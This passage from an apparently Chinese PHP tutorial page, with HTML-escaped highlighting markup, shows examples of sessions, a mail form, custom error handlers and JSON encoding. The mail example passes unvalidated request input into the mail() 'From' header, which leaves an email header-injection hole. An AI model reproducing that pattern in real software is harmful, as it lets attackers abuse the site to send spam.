&lt;span class=&#34;token function&#34;&gt;session_start&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;// 存储 session 数据&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$_SESSION&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;views&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token delimiter important&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;

&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;html&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;head&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
    &lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;meta&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;charset&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;utf-8&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
    &lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;title&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;菜鸟教程(runoob.com)&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;title&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;head&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;body&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;

&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;// 检索 session 数据&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;浏览量：&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$_SESSION&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;views&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token delimiter important&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;


&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;

&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_SESSION&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;views&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;token variable&#34;&gt;$_SESSION&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;views&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_SESSION&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;views&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;token variable&#34;&gt;$_SESSION&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;views&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;浏览量：&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$_SESSION&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;views&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token delimiter important&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;

&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_SESSION&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;views&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;unset&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_SESSION&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;views&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;//session_destroy();&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;xiaohui&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;token delimiter important&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;body&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;html&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;mail&#34;&gt;&lt;a href=&#34;#mail&#34; class=&#34;headerlink&#34; title=&#34;mail&#34;&gt;&lt;/a&gt;mail&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-php&#34; data-language=&#34;php&#34;&gt;&lt;code class=&#34;language-php&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;html&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;head&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;meta&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;charset&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;utf-8&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;title&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;菜鸟教程(runoob.com)&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;title&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;head&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;body&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;

&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;email&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// 如果接收到邮箱参数则发送邮件&lt;/span&gt;
    &lt;span class=&#34;token comment&#34;&gt;// 发送邮件&lt;/span&gt;
    &lt;span class=&#34;token variable&#34;&gt;$email&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;email&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;token variable&#34;&gt;$subject&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;subject&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;token variable&#34;&gt;$message&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;message&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;token function&#34;&gt;mail&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;someone@example.com&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$subject&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;
    &lt;span class=&#34;token variable&#34;&gt;$message&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;From:&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$email&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;邮件发送成功&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// 如果没有邮箱参数则显示表单&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;&amp;lt;form method=&#39;post&#39; action=&#39;mailform.php&#39;&amp;gt;
    Email: &amp;lt;input name=&#39;email&#39; type=&#39;text&#39;&amp;gt;&amp;lt;br&amp;gt;
    Subject: &amp;lt;input name=&#39;subject&#39; type=&#39;text&#39;&amp;gt;&amp;lt;br&amp;gt;
    Message:&amp;lt;br&amp;gt;
    &amp;lt;textarea name=&#39;message&#39; rows=&#39;15&#39; cols=&#39;40&#39;&amp;gt;
    &amp;lt;/textarea&amp;gt;&amp;lt;br&amp;gt;
    &amp;lt;input type=&#39;submit&#39;&amp;gt;
    &amp;lt;/form&amp;gt;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;token delimiter important&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;

&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;body&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;html&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;Error&#34;&gt;&lt;a href=&#34;#Error&#34; class=&#34;headerlink&#34; title=&#34;Error&#34;&gt;&lt;/a&gt;Error&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-php&#34; data-language=&#34;php&#34;&gt;&lt;code class=&#34;language-php&#34;&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;// 错误处理函数&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function-definition function&#34;&gt;customError&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$errno&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$errstr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;&amp;lt;b&amp;gt;Error:&amp;lt;/b&amp;gt; [&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$errno&lt;/span&gt;&lt;/span&gt;] &lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$errstr&lt;/span&gt;&lt;/span&gt;&amp;lt;br&amp;gt;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;脚本结束&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;die&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;// 设置错误处理函数&lt;/span&gt;
&lt;span class=&#34;token function&#34;&gt;set_error_handler&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;customError&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token constant&#34;&gt;E_USER_WARNING&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;// 触发错误&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$test&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$test&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;token function&#34;&gt;trigger_error&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;变量值必须小于等于 1&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token constant&#34;&gt;E_USER_WARNING&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;token delimiter important&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;JSON&#34;&gt;&lt;a href=&#34;#JSON&#34; class=&#34;headerlink&#34; title=&#34;JSON&#34;&gt;&lt;/a&gt;JSON&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-php&#34; data-language=&#34;php&#34;&gt;&lt;code class=&#34;language-php&#34;&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;
   &lt;span class=&#34;token variable&#34;&gt;$arr&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;runoob&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;菜鸟教程&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;taobao&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;淘宝网&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
   &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;json_encode&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$arr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// 编码中文&lt;/span&gt;
   &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token constant&#34;&gt;PHP_EOL&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;// 换行符&lt;/span&gt;
